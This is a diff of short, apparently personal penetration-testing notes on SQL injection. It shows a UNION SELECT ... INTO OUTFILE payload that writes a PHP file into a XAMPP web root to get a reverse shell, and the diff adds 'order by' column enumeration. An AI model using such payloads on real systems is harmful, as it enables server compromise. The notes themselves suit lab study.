@@ -5,5 +5,10 @@
 * Getting reverse shell
   * ?id=769 union all select 1,2,3,4,"",6 into OUTFILE 'c:/xampp/htdocs/rev\_shell.php'
   * this is the syntax, now just we need a php reverse shell code on liner.
-  * 
+
+
+
+## Enumeration
+
+* `order by 1` followed by 2, 3, 4.. is used for column enumeration.
 
